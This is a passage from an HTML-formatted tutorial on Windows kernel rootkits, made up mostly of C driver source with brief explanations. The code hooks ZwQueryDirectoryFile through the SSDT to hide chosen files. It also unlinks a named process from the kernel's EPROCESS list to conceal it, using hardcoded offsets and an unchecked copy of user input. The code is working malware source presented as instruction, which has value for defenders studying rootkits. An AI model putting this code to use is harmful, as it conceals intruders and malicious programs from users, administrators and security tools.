<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
no;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PIO_STACK_LOCATION
irpStack;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;DriverDispatcher&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>irpStack
= IoGetCurrentIrpStackLocation (Irp);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;DriverDispatcher&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
(irpStack-&gt;MajorFunction == IRP_MJ_CREATE)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
(irpStack-&gt;MajorFunction == IRP_MJ_DEVICE_CONTROL)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
*inputBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ANSI_STRING
aStr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>inputBuffer
= Irp-&gt;AssociatedIrp.SystemBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>inputBufferLength
= irpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>strncpy(filename,inputBuffer,inputBufferLength);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>filename[inputBufferLength]=0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RtlInitAnsiString(&amp;aStr,filename);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RtlAnsiStringToUnicodeString(&amp;uStr,
&amp;aStr, TRUE);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;%s
inputBufferLength=%d %s
%S&quot;,filename,inputBufferLength,aStr.Buffer,uStr.Buffer);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Irp-&gt;IoStatus.Status
= STATUS_SUCCESS;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm
cli<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)OldZwQueryDirectoryFile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm
sti<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoDeleteSymbolicLink(&amp;gSymbolicLinkName);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoDeleteDevice(gpDeviceObject);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
*p;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
2&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RtlInitUnicodeString(&amp;gDeviceName,L&quot;\\Device\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RtlInitUnicodeString(&amp;gSymbolicLinkName,L&quot;\\DosDevices\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCreateDevice
(driverObject,0,&amp;gDeviceName,FILE_DEVICE_UNKNOWN,0,0,&amp;gpDeviceObject);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCreateSymbolicLink(&amp;gSymbolicLinkName,
&amp;gDeviceName);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= (char *) ZwQueryDirectoryFile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= p + 1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>no
= *(long *)p;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>OldZwQueryDirectoryFile=
(qtype)KeServiceDescriptorTable. ServiceTableBase [no];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm
cli<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)NewZwQueryDirectoryFile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm
sti<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Nothing
much to explain in the above program as they are a merger of two programs. We
create a global variable proc which is a pointer to our familiar structure
process. Each time we set the value to the variable PsGetCurrentProcess. We
then scan the circular link list until we come back to where we started. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Each
time we check for the ascii process name stored in filename and the one pointer
to by proc. If we meet a match we quit out and then when we are out of the for
loop we check if we got out of the for loop if we met a match. If yes, we take
the previous Blink and point it to Flink the next one. This error check we do
not have included in our earlier programs. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
code should have actually been placed in the DriverDispatcher function as we
want it to be done just once. When we uninstall the driver, we do not get our
program name back as we have not saved where its EPROCESS structure is. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Maybe
we should have used ZwQuerySystemInformation with a value of 5. That code
uninstalls perfectly and thus you could cut copy paste that code instead.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P67<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
NewZwQueryDirectoryFile(HANDLE hFile,HANDLE hEvent,PIO_APC_ROUTINE IoApcRoutine,PVOID
IoApcContext,PIO_STATUS_BLOCK pIoStatusBlock,PVOID FileInformationBuffer,ULONG
FileInformationBufferLength,FILE_INFORMATION_CLASS FileInfoClass,BOOLEAN
bReturnOnlyOneEntry,PUNICODE_STRING PathMask,BOOLEAN bRestartQuery)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
rc;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc=OldZwQueryDirectoryFile(hFile,hEvent,IoApcRoutine,IoApcContext,pIoStatusBlock,FileInformationBuffer,FileInformationBufferLength,FileInfoClass,bReturnOnlyOneEntry,PathMask,bRestartQuery);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;FileInfoClass=%d
rc=%d\n&quot;,FileInfoClass,rc);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(
rc == 0 &amp;&amp; FileInfoClass == 3)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>FILE_BOTH_DIR_INFORMATION
*p,*prev;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
last = 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= prev = (FILE_BOTH_DIR_INFORMATION *)FileInformationBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>while(!last)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( p-&gt;NextEntryOffset == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>last
= 1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>wcsncpy(uFileName,p-&gt;FileName,p-&gt;FileNameLength/2);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>uFileName[p-&gt;FileNameLength/2]
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;%S
Delta=%d&quot;,uFileName,p-&gt;NextEntryOffset);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( wcsncmp(p-&gt;FileName,uStr.Buffer,inputBufferLength)<span
style="mso-spacerun: yes">  </span>== 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(
last ) <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<span
style='mso-tab-count:2'>                       </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(
p == (FILE_BOTH_DIR_INFORMATION *) FileInformationBuffer ) <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc
=0x80000006;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>else
<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev-&gt;NextEntryOffset
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>else
<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
iPos = ((ULONG)p) - (ULONG) FileInformationBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
iLeft = (long) FileInformationBufferLength - iPos - p-&gt;NextEntryOffset;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RtlCopyMemory(
p,(PVOID)( (char *)p + p-&gt;NextEntryOffset),(long)iLeft);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>continue;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev
= p;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= (FILE_BOTH_DIR_INFORMATION *)((char *)p + (int)p-&gt;NextEntryOffset);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>proc=
(struct process *)PsGetCurrentProcess();<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;proc=%x
name=%s&quot;,proc,filename);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>startpid
= proc-&gt;pid;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>while
(1)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( strncmp(filename,(char *)proc + 508,inputBufferLength) == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>proc
= (struct process *)( (char *)proc-&gt;Flink - 160);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( startpid == proc-&gt;pid)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( startpid != proc-&gt;pid)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>*((long
*)proc-&gt;Blink) = (long) proc-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(rc);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
tried another way of hiding files using another piece of code that we got from
Greg Hogland. Lets look at his code first and tell you why things do not work.
The only change in code is in the if statement where we check for a file name
match. The last variable is 0 always and when it becomes one, we know that we
are on the last structure. Thus when the else gets called we know that the
match is not on the last file name. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
variable p keeps going from file name structure to structure, but the variable FileInformationBuffer
is constant. Thus iPos which is the difference between p and
FileInformationBuffer tells us how bytes we have read or how many structures we
have seen. The size of each structure is different as the file names are
different. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thus
if the first structure size is 100, the second 200 and our file name is the
third, iPos will be 300. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Then
we subtract FileInformationBufferLength the total length of all structures and
iPos which is what we have read to give us the total left. We also subtract
from here the size of the current file name structure that we are on. <o:p></o:p></span></p>

